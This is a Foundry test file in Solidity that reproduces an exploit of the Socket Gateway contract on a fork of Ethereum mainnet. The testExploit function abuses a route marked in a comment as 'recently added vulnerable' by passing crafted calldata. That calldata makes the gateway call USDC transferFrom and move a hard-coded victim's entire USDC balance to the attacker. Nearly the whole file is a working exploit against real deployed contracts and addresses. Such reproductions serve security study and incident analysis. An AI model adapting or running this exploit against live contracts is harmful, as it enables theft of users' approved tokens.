// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";

import "./ISocketGateway.sol";

SocketGateway constant gateway = SocketGateway(
    payable(0x3a23F943181408EAC424116Af7b7790c94Cb97a5)
);
IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
address constant Victim = 0x7d03149A2843E4200f07e858d6c0216806Ca4242;

//In this example i didnt do a batch transferfrom for multiple target addresses,just did one for simplicity
contract SocketGatewayTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19_021_453);
        USDC.approve(address(gateway), type(uint256).max);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("USDC preview", USDC.balanceOf(address(this)), 6);

        uint32 routeId = 406; //Recently added vulnerable route id

        bytes memory callDataX = abi.encodeWithSelector(
            USDC.transferFrom.selector,
            Victim,
            address(this),
            USDC.balanceOf(Victim)
        );

        // bytes memory swapExtraData = getCallData(address(USDC), user);

        bytes memory callDataX2 = abi.encodeWithSelector(
            IWrappedTokenSwapperImpl.performAction.selector,
            address(USDC),
            address(USDC),
            0,
            address(this),
            bytes32(""),
            callDataX
        );

        gateway.executeRoute(routeId, callDataX2);

        print("USDC after", USDC.balanceOf(address(this)), 6);
    }

    receive() external payable {}
}
